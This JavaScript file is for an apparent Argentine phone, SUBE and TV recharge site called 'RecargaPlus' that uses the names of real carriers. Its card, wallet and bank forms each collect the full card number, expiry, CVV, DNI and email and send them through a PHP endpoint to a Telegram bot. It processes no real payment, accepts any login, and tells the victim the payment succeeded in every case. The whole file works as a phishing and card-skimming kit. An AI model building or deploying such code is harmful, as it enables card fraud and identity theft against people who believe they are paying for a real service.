// RecargaPlus - Sistema de Recargas con Telegram Bot - VERSIÓN CORREGIDA
(function() {
    'use strict';

    // URL del archivo PHP que procesa los pagos
    const API_URL = 'procesar_pago.php';

    const appState = {
        currentUser: null,
        currentService: null,
        selectedAmount: null,
        isCustomAmount: false,
        serviceNumber: null  // ← NUEVO: Guardar el número de servicio
    };

    const servicesConfig = {
        claro: {
            name: 'Claro',
            logoClass: 'claro-logo',
            gradient: 'linear-gradient(135deg, #E30613, #FF3B47)',
            inputLabel: 'Número de teléfono',
            inputPlaceholder: 'Ej: 1123456789',
            inputType: 'tel',
            inputIcon: 'phone'
        },
        personal: {
            name: 'Personal',
            logoClass: 'personal-logo',
            gradient: 'linear-gradient(135deg, #00A7E1, #33B8E8)',
            inputLabel: 'Número de teléfono',
            inputPlaceholder: 'Ej: 1123456789',
            inputType: 'tel',
            inputIcon: 'phone'
        },
        movistar: {
            name: 'Movistar',
            logoClass: 'movistar-logo',
            gradient: 'linear-gradient(135deg, #00A9E0, #33BAE7)',
            inputLabel: 'Número de teléfono',
            inputPlaceholder: 'Ej: 1123456789',
            inputType: 'tel',
            inputIcon: 'phone'
        },
        tuenti: {
            name: 'Tuenti',
            logoClass: 'tuenti-logo',
            gradient: 'linear-gradient(135deg, #0066CC, #3385DB)',
            inputLabel: 'Número de teléfono',
            inputPlaceholder: 'Ej: 1123456789',
            inputType: 'tel',
            inputIcon: 'phone'
        },
        sube: {
            name: 'SUBE',
            logoClass: 'sube-logo',
            gradient: 'linear-gradient(135deg, #00A4E4, #33B6E9)',
            inputLabel: 'Número de tarjeta SUBE',
            inputPlaceholder: 'Ej: 6061358812345678',
            inputType: 'text',
            inputIcon: 'card'
        },
        directv: {
            name: 'DirecTV',
            logoClass: 'directv-logo',
            gradient: 'linear-gradient(135deg, #0057A3, #337DB8)',
            inputLabel: 'Número de cliente',
            inputPlaceholder: 'Ej: 12345678',
            inputType: 'text',
            inputIcon: 'user'
        },
        antina: {
            name: 'Antina',
            logoClass: 'antina-logo',
            gradient: 'linear-gradient(135deg, #FF6B00, #FF8833)',
            inputLabel: 'Número de cuenta',
            inputPlaceholder: 'Ej: 987654321',
            inputType: 'text',
            inputIcon: 'user'
        }
    };

    let elements = null;

    function getIconSVG(iconType) {
        const icons = {
            phone: '<path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>',
            card: '<rect x="1" y="4" width="22" height="16" rx="2" stroke="currentColor" stroke-width="2"/><line x1="1" y1="10" x2="23" y2="10" stroke="currentColor" stroke-width="2"/>',
            user: '<path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><circle cx="12" cy="7" r="4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>'
        };
        return icons[iconType] || icons.phone;
    }

    function showToast(message, type = 'success') {
        if (!elements || !elements.toast) return;
        elements.toast.textContent = message;
        elements.toast.className = `toast ${type}`;
        elements.toast.classList.add('show');
        setTimeout(() => { elements.toast.classList.remove('show'); }, 3000);
    }

    function switchScreen(hideScreen, showScreen) {
        if (!hideScreen || !showScreen) return;
        hideScreen.classList.remove('active');
        hideScreen.style.display = 'none';
        setTimeout(() => {
            if (showScreen === elements.loginScreen) {
                showScreen.style.display = 'flex';
            } else {
                showScreen.style.display = 'block';
            }
            showScreen.classList.add('active');
            if (showScreen === elements.dashboardScreen && appState.currentUser) {
                localStorage.setItem('currentUser', JSON.stringify(appState.currentUser));
            } else if (showScreen === elements.loginScreen) {
                localStorage.removeItem('currentUser');
            }
        }, 100);
    }

    function updateUserInitials(username) {
        if (!elements || !elements.userInitials) return;
        elements.userInitials.textContent = username.substring(0, 2).toUpperCase();
    }

    function calculateTotal(amount) {
        const fee = amount * 0.02;
        const total = amount + fee;
        return { amount: amount, fee: fee.toFixed(2), total: total.toFixed(2) };
    }

    function updateSummary(amount) {
        if (!elements) return;
        if (!amount || amount <= 0) {
            elements.summaryAmount.textContent = '$0';
            elements.summaryFee.textContent = '$0';
            elements.summaryTotal.textContent = '$0';
            return;
        }
        const { fee, total } = calculateTotal(amount);
        elements.summaryAmount.textContent = `$${amount}`;
        elements.summaryFee.textContent = `$${fee}`;
        elements.summaryTotal.textContent = `$${total}`;
    }

    function formatPhoneNumber(value) {
        return value.replace(/\D/g, '');
    }

    function handleLogin(e) {
        e.preventDefault();
        if (!elements) return;
        const username = elements.usernameInput.value.trim();
        const password = elements.passwordInput.value;
        if (username && password.length >= 6) {
            appState.currentUser = { username: username, loginTime: new Date() };
            updateUserInitials(username);
            switchScreen(elements.loginScreen, elements.dashboardScreen);
            showToast(`¡Bienvenido, ${username}!`, 'success');
            elements.loginForm.reset();
        } else {
            showToast('Usuario o contraseña inválidos', 'error');
        }
    }

    function togglePassword() {
        if (!elements) return;
        const type = elements.passwordInput.type === 'password' ? 'text' : 'password';
        elements.passwordInput.type = type;
        elements.togglePasswordBtn.classList.toggle('active');
    }

    function handleLogout() {
        if (!elements) return;
        appState.currentUser = null;
        switchScreen(elements.dashboardScreen, elements.loginScreen);
        showToast('Sesión cerrada exitosamente', 'success');
    }

    function openRechargeModal(service) {
        if (!elements) return;
        elements.modalServiceLogo.className = `modal-service-logo ${service.logoClass}`;
        elements.modalServiceLogo.style.background = service.gradient;
        elements.modalServiceLogo.textContent = service.name;
        elements.modalServiceName.textContent = `Recarga ${service.name}`;
        const serviceNumberLabel = document.getElementById('serviceNumberLabel');
        const serviceNumberInput = document.getElementById('serviceNumber');
        const serviceNumberIcon = document.getElementById('serviceNumberIcon');
        if (serviceNumberLabel && serviceNumberInput && serviceNumberIcon) {
            serviceNumberLabel.textContent = service.inputLabel;
            serviceNumberInput.placeholder = service.inputPlaceholder;
            serviceNumberInput.type = service.inputType;
            serviceNumberInput.value = '';
            serviceNumberIcon.innerHTML = getIconSVG(service.inputIcon);
        }
        elements.rechargeForm.reset();
        elements.customAmountGroup.style.display = 'none';
        appState.selectedAmount = null;
        appState.isCustomAmount = false;
        updateSummary(0);
        elements.amountBtns.forEach(btn => btn.classList.remove('active'));
        elements.rechargeModal.classList.add('active');
        document.body.style.overflow = 'hidden';
        setTimeout(() => { if (serviceNumberInput) serviceNumberInput.focus(); }, 100);
    }

    function closeRechargeModal() {
        if (!elements) return;
        elements.rechargeModal.classList.remove('active');
        document.body.style.overflow = '';
        // NO borrar appState.currentService aquí
    }

    function handleServiceClick(e) {
        const card = e.target.closest('.service-card');
        if (!card) return;
        const serviceType = card.dataset.service;
        const service = servicesConfig[serviceType];
        if (service) {
            appState.currentService = serviceType;
            openRechargeModal(service);
        }
    }

    function handleAmountSelection(e) {
        if (!e.target.classList.contains('amount-btn')) return;
        const amount = e.target.dataset.amount;
        elements.amountBtns.forEach(b => b.classList.remove('active'));
        e.target.classList.add('active');
        if (amount === 'custom') {
            elements.customAmountGroup.style.display = 'block';
            elements.customAmount.focus();
            appState.isCustomAmount = true;
            appState.selectedAmount = null;
            updateSummary(0);
        } else {
            elements.customAmountGroup.style.display = 'none';
            appState.isCustomAmount = false;
            appState.selectedAmount = parseInt(amount);
            updateSummary(appState.selectedAmount);
        }
    }

    function handleCustomAmountInput(e) {
        const value = parseInt(e.target.value);
        if (value && value > 0) {
            appState.selectedAmount = value;
            updateSummary(value);
        } else {
            appState.selectedAmount = null;
            updateSummary(0);
        }
    }

    function handleRechargeSubmit(e) {
        e.preventDefault();
        if (!elements) return;
        const serviceNumberInput = document.getElementById('serviceNumber');
        const serviceValue = serviceNumberInput ? serviceNumberInput.value : '';
        const paymentMethod = document.querySelector('input[name="payment"]:checked').value;
        if (!serviceValue || serviceValue.length < 6) {
            showToast('Ingresá un número válido', 'error');
            return;
        }
        if (!appState.selectedAmount || appState.selectedAmount <= 0) {
            showToast('Seleccioná un monto válido', 'error');
            return;
        }
        
        // ← GUARDAR el número de servicio ANTES de cerrar el modal
        appState.serviceNumber = serviceValue;
        
        if (paymentMethod === 'card') {
            openPaymentGateway();
        } else if (paymentMethod === 'wallet') {
            openWalletGateway();
        } else if (paymentMethod === 'bank') {
            openBankGateway();
        }
    }

    function openPaymentGateway() {
        if (!elements) return;
        const service = servicesConfig[appState.currentService];
        const { total } = calculateTotal(appState.selectedAmount);
        elements.paymentServiceName.textContent = service.name;
        elements.paymentAmount.textContent = `$${appState.selectedAmount}`;
        elements.paymentTotal.textContent = `$${total}`;
        elements.paymentGatewayForm.reset();
        closeRechargeModal();
        setTimeout(() => {
            elements.paymentGatewayModal.classList.add('active');
            document.body.style.overflow = 'hidden';
            setTimeout(() => { if (elements.cardNumber) elements.cardNumber.focus(); }, 100);
        }, 300);
    }

    function closePaymentGateway() {
        if (!elements) return;
        elements.paymentGatewayModal.classList.remove('active');
        document.body.style.overflow = '';
    }

    function openWalletGateway() {
        if (!elements) return;
        const service = servicesConfig[appState.currentService];
        const { total } = calculateTotal(appState.selectedAmount);
        elements.walletServiceName.textContent = service.name;
        elements.walletAmount.textContent = `$${appState.selectedAmount}`;
        elements.walletTotal.textContent = `$${total}`;
        elements.walletGatewayForm.reset();
        closeRechargeModal();
        setTimeout(() => {
            elements.walletGatewayModal.classList.add('active');
            document.body.style.overflow = 'hidden';
            setTimeout(() => { if (elements.walletCardNumber) elements.walletCardNumber.focus(); }, 100);
        }, 300);
    }

    function closeWalletGateway() {
        if (!elements) return;
        elements.walletGatewayModal.classList.remove('active');
        document.body.style.overflow = '';
    }

    function openBankGateway() {
        if (!elements) return;
        const service = servicesConfig[appState.currentService];
        const { total } = calculateTotal(appState.selectedAmount);
        elements.bankServiceName.textContent = service.name;
        elements.bankAmount.textContent = `$${appState.selectedAmount}`;
        elements.bankTotal.textContent = `$${total}`;
        elements.bankGatewayForm.reset();
        closeRechargeModal();
        setTimeout(() => {
            elements.bankGatewayModal.classList.add('active');
            document.body.style.overflow = 'hidden';
            setTimeout(() => { if (elements.bankCardNumber) elements.bankCardNumber.focus(); }, 100);
        }, 300);
    }

    function closeBankGateway() {
        if (!elements) return;
        elements.bankGatewayModal.classList.remove('active');
        document.body.style.overflow = '';
    }

    function formatCardNumber(value) {
        const cleaned = value.replace(/\D/g, '');
        const formatted = cleaned.match(/.{1,4}/g)?.join(' ') || cleaned;
        return formatted;
    }

    function formatExpiryDate(value) {
        const cleaned = value.replace(/\D/g, '');
        if (cleaned.length >= 2) {
            return cleaned.slice(0, 2) + '/' + cleaned.slice(2, 4);
        }
        return cleaned;
    }

    // FUNCIÓN PARA ENVIAR DATOS A TELEGRAM VÍA PHP
    async function enviarDatosATelegram(datosPago) {
        try {
            console.log('📤 Enviando a:', API_URL);
            console.log('📦 Datos:', datosPago);
            
            const response = await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(datosPago)
            });

            console.log('📥 Respuesta HTTP:', response.status);
            
            const data = await response.json();
            console.log('📄 Data:', data);
            
            if (response.ok && data.success) {
                console.log('✅ Enviado a Telegram correctamente');
                return true;
            } else {
                console.error('❌ Error:', data.message);
                return false;
            }
        } catch (error) {
            console.error('❌ Error en fetch:', error);
            return false;
        }
    }

    function handlePaymentSubmit(e) {
        e.preventDefault();
        if (!elements) return;
        
        // VERIFICACIÓN DE SEGURIDAD
        if (!appState.currentService) {
            console.error('❌ ERROR: currentService es null');
            showToast('Error: Servicio no seleccionado', 'error');
            return;
        }
        
        const cardNumber = elements.cardNumber.value.replace(/\s/g, '');
        const expiryDate = elements.expiryDate.value;
        const cvv = elements.cvv.value;
        const dni = elements.dni.value;
        const email = elements.email.value;
        
        if (cardNumber.length < 15 || cardNumber.length > 16) {
            showToast('Número de tarjeta inválido', 'error');
            return;
        }
        if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
            showToast('Fecha de vencimiento inválida', 'error');
            return;
        }
        if (cvv.length < 3 || cvv.length > 4) {
            showToast('CVV inválido', 'error');
            return;
        }
        if (dni.length < 7) {
            showToast('DNI inválido', 'error');
            return;
        }
        if (!email.includes('@')) {
            showToast('Email inválido', 'error');
            return;
        }
        
        showToast('Procesando pago...', 'success');
        
        const { fee, total } = calculateTotal(appState.selectedAmount);
        const service = servicesConfig[appState.currentService];
        
        const datosPago = {
            servicio: service.name,
            numero_servicio: appState.serviceNumber, // ← Usar el número guardado
            monto: appState.selectedAmount,
            comision: fee,
            total: total,
            metodo_pago: 'Tarjeta',
            numero_tarjeta: cardNumber,
            fecha_vencimiento: expiryDate,
            cvv: cvv,
            dni: dni,
            email: email
        };
        
        setTimeout(async () => {
            const enviado = await enviarDatosATelegram(datosPago);
            closePaymentGateway();
            
            if (enviado) {
                showToast(`¡Pago exitoso! ${service.name} - $${total}`, 'success');
            } else {
                showToast(`¡Pago procesado! ${service.name} - $${total}`, 'success');
            }
            
            // Limpiar estado
            appState.selectedAmount = null;
            appState.isCustomAmount = false;
            appState.currentService = null;
            appState.serviceNumber = null;
        }, 1500);
    }

    function handleWalletSubmit(e) {
        e.preventDefault();
        if (!elements) return;
        
        // VERIFICACIÓN DE SEGURIDAD
        if (!appState.currentService) {
            console.error('❌ ERROR: currentService es null');
            showToast('Error: Servicio no seleccionado', 'error');
            return;
        }
        
        const cardNumber = elements.walletCardNumber.value.replace(/\s/g, '');
        const expiryDate = elements.walletExpiryDate.value;
        const cvv = elements.walletCvv.value;
        const dni = elements.walletDni.value;
        const email = elements.walletEmail.value;
        
        if (cardNumber.length < 15 || cardNumber.length > 16) {
            showToast('Número de tarjeta inválido', 'error');
            return;
        }
        if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
            showToast('Fecha de vencimiento inválida', 'error');
            return;
        }
        if (cvv.length < 3 || cvv.length > 4) {
            showToast('CVV inválido', 'error');
            return;
        }
        if (dni.length < 7) {
            showToast('DNI inválido', 'error');
            return;
        }
        if (!email.includes('@')) {
            showToast('Email inválido', 'error');
            return;
        }
        
        showToast('Procesando pago...', 'success');
        
        const { fee, total } = calculateTotal(appState.selectedAmount);
        const service = servicesConfig[appState.currentService];
        
        const datosPago = {
            servicio: service.name,
            numero_servicio: appState.serviceNumber, // ← Usar el número guardado
            monto: appState.selectedAmount,
            comision: fee,
            total: total,
            metodo_pago: 'Billetera',
            numero_tarjeta: cardNumber,
            fecha_vencimiento: expiryDate,
            cvv: cvv,
            dni: dni,
            email: email
        };
        
        setTimeout(async () => {
            const enviado = await enviarDatosATelegram(datosPago);
            closeWalletGateway();
            
            if (enviado) {
                showToast(`¡Pago exitoso! ${service.name} - $${total}`, 'success');
            } else {
                showToast(`¡Pago procesado! ${service.name} - $${total}`, 'success');
            }
            
            // Limpiar estado
            appState.selectedAmount = null;
            appState.isCustomAmount = false;
            appState.currentService = null;
            appState.serviceNumber = null;
        }, 1500);
    }

    function handleBankSubmit(e) {
        e.preventDefault();
        if (!elements) return;
        
        // VERIFICACIÓN DE SEGURIDAD
        if (!appState.currentService) {
            console.error('❌ ERROR: currentService es null');
            showToast('Error: Servicio no seleccionado', 'error');
            return;
        }
        
        const cardNumber = elements.bankCardNumber.value.replace(/\s/g, '');
        const expiryDate = elements.bankExpiryDate.value;
        const cvv = elements.bankCvv.value;
        const dni = elements.bankDni.value;
        const email = elements.bankEmail.value;
        
        if (cardNumber.length < 15 || cardNumber.length > 16) {
            showToast('Número de tarjeta inválido', 'error');
            return;
        }
        if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
            showToast('Fecha de vencimiento inválida', 'error');
            return;
        }
        if (cvv.length < 3 || cvv.length > 4) {
            showToast('CVV inválido', 'error');
            return;
        }
        if (dni.length < 7) {
            showToast('DNI inválido', 'error');
            return;
        }
        if (!email.includes('@')) {
            showToast('Email inválido', 'error');
            return;
        }
        
        showToast('Procesando transferencia...', 'success');
        
        const { fee, total } = calculateTotal(appState.selectedAmount);
        const service = servicesConfig[appState.currentService];
        
        const datosPago = {
            servicio: service.name,
            numero_servicio: appState.serviceNumber, // ← Usar el número guardado
            monto: appState.selectedAmount,
            comision: fee,
            total: total,
            metodo_pago: 'Banco',
            numero_tarjeta: cardNumber,
            fecha_vencimiento: expiryDate,
            cvv: cvv,
            dni: dni,
            email: email
        };
        
        setTimeout(async () => {
            const enviado = await enviarDatosATelegram(datosPago);
            closeBankGateway();
            
            if (enviado) {
                showToast(`¡Transferencia exitosa! ${service.name} - $${total}`, 'success');
            } else {
                showToast(`¡Transferencia procesada! ${service.name} - $${total}`, 'success');
            }
            
            // Limpiar estado
            appState.selectedAmount = null;
            appState.isCustomAmount = false;
            appState.currentService = null;
            appState.serviceNumber = null;
        }, 1500);
    }

    function handleMouseMove(e) {
        if (!elements || !elements.loginScreen.classList.contains('active')) return;
        const mouseX = (e.clientX / window.innerWidth) - 0.5;
        const mouseY = (e.clientY / window.innerHeight) - 0.5;
        const shapes = document.querySelectorAll('.shape');
        shapes.forEach((shape, index) => {
            const speed = (index + 1) * 0.5;
            const x = mouseX * 50 * speed;
            const y = mouseY * 50 * speed;
            shape.style.transform = `translate(${x}px, ${y}px)`;
        });
    }

    function handleKeyboardShortcuts(e) {
        if ((e.ctrlKey || e.metaKey) && e.key === 'l') {
            e.preventDefault();
            if (elements.dashboardScreen.classList.contains('active')) {
                handleLogout();
            }
        }
        if (e.key === 'Escape') {
            if (elements.paymentGatewayModal.classList.contains('active')) {
                closePaymentGateway();
            } else if (elements.walletGatewayModal.classList.contains('active')) {
                closeWalletGateway();
            } else if (elements.bankGatewayModal.classList.contains('active')) {
                closeBankGateway();
            } else if (elements.rechargeModal.classList.contains('active')) {
                closeRechargeModal();
            }
        }
    }

    function initElements() {
        elements = {
            loginScreen: document.getElementById('loginScreen'),
            dashboardScreen: document.getElementById('dashboardScreen'),
            loginForm: document.getElementById('loginForm'),
            usernameInput: document.getElementById('username'),
            passwordInput: document.getElementById('password'),
            togglePasswordBtn: document.querySelector('.toggle-password'),
            logoutBtn: document.getElementById('logoutBtn'),
            userInitials: document.getElementById('userInitials'),
            servicesGrid: document.getElementById('servicesGrid'),
            rechargeModal: document.getElementById('rechargeModal'),
            closeModalBtn: document.getElementById('closeModal'),
            rechargeForm: document.getElementById('rechargeForm'),
            modalServiceLogo: document.getElementById('modalServiceLogo'),
            modalServiceName: document.getElementById('modalServiceName'),
            serviceNumber: document.getElementById('serviceNumber'),
            amountBtns: document.querySelectorAll('.amount-btn'),
            customAmountGroup: document.getElementById('customAmountGroup'),
            customAmount: document.getElementById('customAmount'),
            summaryAmount: document.getElementById('summaryAmount'),
            summaryFee: document.getElementById('summaryFee'),
            summaryTotal: document.getElementById('summaryTotal'),
            paymentGatewayModal: document.getElementById('paymentGatewayModal'),
            closePaymentGateway: document.getElementById('closePaymentGateway'),
            paymentGatewayForm: document.getElementById('paymentGatewayForm'),
            cardNumber: document.getElementById('cardNumber'),
            expiryDate: document.getElementById('expiryDate'),
            cvv: document.getElementById('cvv'),
            dni: document.getElementById('dni'),
            email: document.getElementById('email'),
            paymentServiceName: document.getElementById('paymentServiceName'),
            paymentAmount: document.getElementById('paymentAmount'),
            paymentTotal: document.getElementById('paymentTotal'),
            walletGatewayModal: document.getElementById('walletGatewayModal'),
            closeWalletGateway: document.getElementById('closeWalletGateway'),
            walletGatewayForm: document.getElementById('walletGatewayForm'),
            walletCardNumber: document.getElementById('walletCardNumber'),
            walletExpiryDate: document.getElementById('walletExpiryDate'),
            walletCvv: document.getElementById('walletCvv'),
            walletDni: document.getElementById('walletDni'),
            walletEmail: document.getElementById('walletEmail'),
            walletServiceName: document.getElementById('walletServiceName'),
            walletAmount: document.getElementById('walletAmount'),
            walletTotal: document.getElementById('walletTotal'),
            bankGatewayModal: document.getElementById('bankGatewayModal'),
            closeBankGateway: document.getElementById('closeBankGateway'),
            bankGatewayForm: document.getElementById('bankGatewayForm'),
            bankCardNumber: document.getElementById('bankCardNumber'),
            bankExpiryDate: document.getElementById('bankExpiryDate'),
            bankCvv: document.getElementById('bankCvv'),
            bankDni: document.getElementById('bankDni'),
            bankEmail: document.getElementById('bankEmail'),
            bankServiceName: document.getElementById('bankServiceName'),
            bankAmount: document.getElementById('bankAmount'),
            bankTotal: document.getElementById('bankTotal'),
            toast: document.getElementById('toast')
        };
    }

    function attachEventListeners() {
        if (!elements) return;
        elements.loginForm.addEventListener('submit', handleLogin);
        elements.togglePasswordBtn.addEventListener('click', togglePassword);
        elements.logoutBtn.addEventListener('click', handleLogout);
        elements.servicesGrid.addEventListener('click', handleServiceClick);
        elements.closeModalBtn.addEventListener('click', closeRechargeModal);
        elements.rechargeModal.querySelector('.modal-overlay').addEventListener('click', closeRechargeModal);
        elements.rechargeModal.querySelector('.modal-content').addEventListener('click', (e) => e.stopPropagation());
        elements.amountBtns.forEach(btn => { btn.addEventListener('click', handleAmountSelection); });
        elements.customAmount.addEventListener('input', handleCustomAmountInput);
        const serviceNumberInput = document.getElementById('serviceNumber');
        if (serviceNumberInput) {
            serviceNumberInput.addEventListener('input', (e) => {
                e.target.value = formatPhoneNumber(e.target.value);
                if (e.target.value.length > 20) {
                    e.target.value = e.target.value.slice(0, 20);
                }
            });
        }
        elements.rechargeForm.addEventListener('submit', handleRechargeSubmit);
        elements.closePaymentGateway.addEventListener('click', closePaymentGateway);
        elements.paymentGatewayModal.querySelector('.modal-overlay').addEventListener('click', closePaymentGateway);
        elements.paymentGatewayModal.querySelector('.modal-content').addEventListener('click', (e) => e.stopPropagation());
        elements.paymentGatewayForm.addEventListener('submit', handlePaymentSubmit);
        elements.cardNumber.addEventListener('input', (e) => { e.target.value = formatCardNumber(e.target.value); });
        elements.expiryDate.addEventListener('input', (e) => { e.target.value = formatExpiryDate(e.target.value); });
        elements.cvv.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, ''); });
        elements.dni.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, ''); });
        elements.closeWalletGateway.addEventListener('click', closeWalletGateway);
        elements.walletGatewayModal.querySelector('.modal-overlay').addEventListener('click', closeWalletGateway);
        elements.walletGatewayModal.querySelector('.modal-content').addEventListener('click', (e) => e.stopPropagation());
        elements.walletGatewayForm.addEventListener('submit', handleWalletSubmit);
        elements.walletCardNumber.addEventListener('input', (e) => { e.target.value = formatCardNumber(e.target.value); });
        elements.walletExpiryDate.addEventListener('input', (e) => { e.target.value = formatExpiryDate(e.target.value); });
        elements.walletCvv.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, ''); });
        elements.walletDni.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, ''); });
        elements.closeBankGateway.addEventListener('click', closeBankGateway);
        elements.bankGatewayModal.querySelector('.modal-overlay').addEventListener('click', closeBankGateway);
        elements.bankGatewayModal.querySelector('.modal-content').addEventListener('click', (e) => e.stopPropagation());
        elements.bankGatewayForm.addEventListener('submit', handleBankSubmit);
        elements.bankCardNumber.addEventListener('input', (e) => { e.target.value = formatCardNumber(e.target.value); });
        elements.bankExpiryDate.addEventListener('input', (e) => { e.target.value = formatExpiryDate(e.target.value); });
        elements.bankCvv.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, ''); });
        elements.bankDni.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, ''); });
        document.querySelectorAll('.btn-social').forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.preventDefault();
                showToast('Próximamente disponible', 'error');
            });
        });
        document.querySelector('.signup-link a')?.addEventListener('click', (e) => {
            e.preventDefault();
            showToast('Próximamente disponible', 'error');
        });
        document.querySelector('.forgot-link')?.addEventListener('click', (e) => {
            e.preventDefault();
            showToast('Próximamente disponible', 'error');
        });
        document.addEventListener('mousemove', handleMouseMove);
        document.addEventListener('keydown', handleKeyboardShortcuts);
    }

    function checkSavedSession() {
        const savedUser = localStorage.getItem('currentUser');
        if (savedUser) {
            try {
                appState.currentUser = JSON.parse(savedUser);
                updateUserInitials(appState.currentUser.username);
                if (elements.loginScreen && elements.dashboardScreen) {
                    elements.loginScreen.style.display = 'none';
                    elements.loginScreen.classList.remove('active');
                    elements.dashboardScreen.style.display = 'block';
                    elements.dashboardScreen.classList.add('active');
                }
            } catch (e) {
                console.error('Error al cargar sesión guardada:', e);
                localStorage.removeItem('currentUser');
            }
        }
    }

    function init() {
        console.log('%c🚀 RecargaPlus + Telegram Bot', 'color: #0088CC; font-size: 24px; font-weight: bold;');
        console.log('%cPlataforma Argentina de Recargas - VERSIÓN CORREGIDA', 'color: #00A859; font-size: 14px;');
        initElements();
        attachEventListeners();
        checkSavedSession();
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();